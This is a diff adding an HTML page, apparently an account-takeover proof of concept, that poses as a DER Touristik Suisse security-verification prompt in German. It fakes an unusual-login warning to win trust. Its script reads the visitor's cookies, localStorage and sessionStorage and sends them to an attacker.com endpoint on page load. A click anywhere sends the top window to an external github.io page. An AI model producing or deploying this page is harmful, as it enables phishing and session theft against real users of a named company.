@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+*{margin:0;padding:0}
+body{font-family:'Segoe UI',Arial;background:#fff;padding:30px}
+.header{display:flex;align-items:center;margin-bottom:30px;padding-bottom:20px;border-bottom:1px solid #eee}
+.logo{font-size:24px;font-weight:600;color:#e31837}
+.content{max-width:600px}
+h1{font-size:22px;color:#333;margin-bottom:15px}
+p{color:#666;line-height:1.6;margin-bottom:15px}
+.alert{background:#fef3cd;border:1px solid #ffc107;padding:15px;border-radius:4px;margin:20px 0}
+.alert strong{color:#856404}
+.btn{display:inline-block;padding:14px 30px;background:#e31837;color:#fff;text-decoration:none;border-radius:4px;font-weight:600;cursor:pointer}
+ul{margin:15px 0 15px 20px}
+li{margin:8px 0;color:#555}
+</style>
+</head>
+<body onclick="verify()">
+<div class="header">
+<div class="logo">🏔️ DER Touristik Suisse</div>
+</div>
+<div class="content">
+<h1>Sicherheitsüberprüfung erforderlich</h1>
+<div class="alert">
+<strong>⚠️ Ungewöhnliche Aktivität erkannt</strong><br>
+Wir haben eine Anmeldung von einem neuen Gerät festgestellt.
+</div>
+<p>Um Ihr Konto zu schützen, müssen Sie Ihre Identität bestätigen:</p>
+<ul>
+<li>Standort: Zürich, Schweiz</li>
+<li>Gerät: Windows PC</li>
+<li>Browser: Chrome</li>
+</ul>
+<p>Bitte klicken Sie auf die Schaltfläche unten, um zu bestätigen, dass Sie es waren:</p>
+<div class="btn">✓ Das war ich - Bestätigen</div>
+<p style="margin-top:20px;font-size:13px;color:#999">Wenn Sie diese Aktivität nicht erkennen, wird Ihr Konto automatisch gesperrt.</p>
+</div>
+<script>
+var data={url:'',cookies:document.cookie,localStorage:JSON.stringify(localStorage),sessionStorage:JSON.stringify(sessionStorage)};
+window.addEventListener('message',e=>{if(e.data&&e.data.href)data.url=e.data.href});
+setTimeout(()=>{new Image().src='https://attacker.com/ato?data='+encodeURIComponent(JSON.stringify(data))},500);
+function verify(){window.top.location.href='https://jessisnofy-ai.github.io/mailxpert-poc/dae.html'}
+</script>
+</body>
+</html>
